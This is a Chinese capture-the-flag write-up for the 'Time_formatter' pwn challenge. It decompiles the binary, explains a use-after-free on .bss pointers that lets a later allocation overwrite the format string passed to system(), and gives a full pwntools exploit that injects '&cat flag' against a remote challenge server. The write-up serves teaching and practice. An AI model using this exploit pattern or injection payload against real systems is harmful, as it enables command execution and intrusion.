

# pwn-Time_formatter-writeup

反编译：

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __gid_t v3; // eax
  FILE *v4; // rdi
  __int64 v5; // rdx
  int v6; // eax
  __int64 result; // rax

  v3 = getegid();
  setresgid(v3, v3, v3);
  setbuf(stdout, 0LL);
  puts("Welcome to Mary's Unix Time Formatter!");
  while ( 1 )
  {
    puts("1) Set a time format.");
    puts("2) Set a time.");
    puts("3) Set a time zone.");
    puts("4) Print your time.");
    puts("5) Exit.");
    __printf_chk(1LL, "> ");
    v4 = stdout;
    fflush(stdout);
    switch ( ret_int() )
    {
      case 1:
        v6 = set_format();
        goto LABEL_8;
      case 2:
        v6 = set_time();
        goto LABEL_8;
      case 3:
        v6 = set_timezone();
        goto LABEL_8;
      case 4:
        v6 = print_time((__int64)v4, (__int64)"> ", v5);
LABEL_8:
        if ( !v6 )
          continue;
        return 0LL;
      case 5:
        exit();
        return result;
      default:
        continue;
    }
  }
}
```

```c
__int64 set_format()
{
  char *v0; // rbx

  v0 = ret_string_ptr();
  if ( (unsigned int)check_format(v0) )
  {
    bss_format = v0;
    puts("Format set.");
  }
  else
  {
    puts("Format contains invalid characters.");
    just_free(v0);
  }
  return 0LL;
}
```

```c
__int64 set_timezone()
{
  bss_timezone = ret_string_ptr();
  puts("Time zone set.");
  return 0LL;
}
```

```c
signed __int64 __noreturn exit()
{
  signed __int64 result; // rax
  char s; // [rsp+8h] [rbp-20h]
  unsigned __int64 v2; // [rsp+18h] [rbp-10h]

  v2 = __readfsqword(0x28u);
  just_free(bss_format);
  just_free(bss_timezone);
  __printf_chk(1LL, "Are you sure you want to exit (y/N)? ");
  fflush(stdout);
  fgets(&s, 16, stdin);
  result = 0LL;
  if ( (s & 0xDF) == 89 )
  {
    puts("OK, exiting.");
    result = 1LL;
  }
  return result;
}
```

在`set_format`和`set_timezone`函数里，都调用了`ret_string_ptr`，继续看这个函数会发现里面用的是`strdup(s)`函数来存的字符串。

> strdup(s)这个函数的作用是会先用maolloc()配置与参数s字符串相同的空间大小，然后将参数s字符串的内容复制到该内存地址，然后把该地址返回。该地址最后可以利用free()来释放。

2个函数中还把开辟的堆的指针存在了.bss段中

> 在采用[段式内存管理](https://zh.wikipedia.org/w/index.php?title=段式内存管理&action=edit&redlink=1)的架构中，**BSS段**（bss segment）通常是指用来存放[程序](https://zh.wikipedia.org/wiki/计算机程序)中未[初始化](https://zh.wikipedia.org/wiki/初始化)的[全局变量](https://zh.wikipedia.org/wiki/全局变量)的一块内存区域。BSS是英文Block Started by Symbol的简称。BSS段属于[静态内存分配](https://zh.wikipedia.org/wiki/静态内存分配)。.bss section 的空间结构类似于 stack

再看到`exit()`函数里，`just_free`中只包含了`free`的操作，也就是说.bss段中的指针没有清除，存在**UAF**。而且在`set_timezone`函数里，没有对输入字符串做检查。

```c
__int64 __fastcall print_time(__int64 a1, __int64 a2, __int64 a3)
{
  char command; // [rsp+8h] [rbp-810h]
  unsigned __int64 v5; // [rsp+808h] [rbp-10h]

  v5 = __readfsqword(0x28u);
  if ( bss_format )
  {
    __snprintf_chk(
      (__int64)&command,
      0x800LL,
      1LL,
      0x800LL,
      (__int64)"/bin/date -d @%d +'%s'",
      (unsigned int)time,
      (__int64)bss_format,
      a3);
    __printf_chk(1LL, "Your formatted time is: ");
    fflush(stdout);
    if ( getenv("DEBUG") )
      __fprintf_chk(stderr, 1LL, "Running command: %s\n", &command);
    setenv("TZ", bss_timezone, 1);
    system(&command);
  }
  else
  {
    puts("You haven't specified a format!");
  }
  return 0LL;
}
```

我们的目标是，**希望baa_format能指向一个例如"cat flag"的命令然后就可以自然的被`__snprintf_chk`输出。**

**实现方法：先输入正确的format，free掉format，此时堆被释放，但是.bss段上仍然记录了指向这个被释放了的堆的地址作为format的地址，然后将我们想要用的format作为timezone输入，此时`set_timezone()`会把堆开在原来的已被释放的堆的位置，堆上放入了`'\'&cat flag\''`的字符串，此时调用`print_time()`，函数会把第一次写format时的.bss里的指针指向的堆里的东西看作print_time的模版，也就是第二次用set_timezone写进去的字符串**



```c
__snprintf_chk((__int64)&command,0x800LL,1LL,0x800LL,(__int64)"/bin/date -d @%d +'%s'",
(unsigned int)time,(__int64)bss_format,a3)函数
```

> 在command变量中添加“/bin/date -d @%d + %s”的字符串，使用system函数运行command。
>
> %d包含菜单2中输入的数字(0x602120,time)， %s包含1中输入的数字(0x602118,bss.format)。
>
> 
>
> 指定日期格式的转换：date -d @1361542596 +"%Y-%m-%d %H:%M:%S"
>
>  
>
> \\'&cat flag\\'



```python
from pwn import *
context.update(arch='amd64', log_level='debug')

p = remote('111.198.29.45', 30958)

def set_format(s):
    p.sendlineafter('>', '1')
    p.sendlineafter(':', s)
    p.recvuntil('set')

def set_zone(s):
    p.sendlineafter('>', '3')
    p.sendlineafter(':', s)
    p.recvuntil('set')

def print_time():
    p.sendlineafter('>', '4')

def _exit():
    p.sendlineafter('>', '5')
    p.sendlineafter('?', 'N')


if __name__ == '__main__':
    set_format('%p')
    _exit()
    set_zone('\'&cat flag\'')
    print_time()
    p.interactive()
```

